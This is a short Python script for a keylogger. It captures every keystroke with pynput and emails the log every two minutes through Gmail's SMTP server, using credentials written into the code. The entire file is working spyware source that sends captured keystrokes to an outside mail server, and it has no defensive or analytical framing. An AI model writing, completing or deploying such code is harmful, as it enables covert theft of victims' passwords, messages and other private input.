#!usr/bin/env python

import pynput.keyboard
import threading
import smtplib

log = "Keylogger Started"


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    send_mail("email@mail.com", "password", "\n"+log)
    log = ""
    timer = threading.Timer(120, report)
    timer.start()


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  #google allow to send mail by their servers
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()

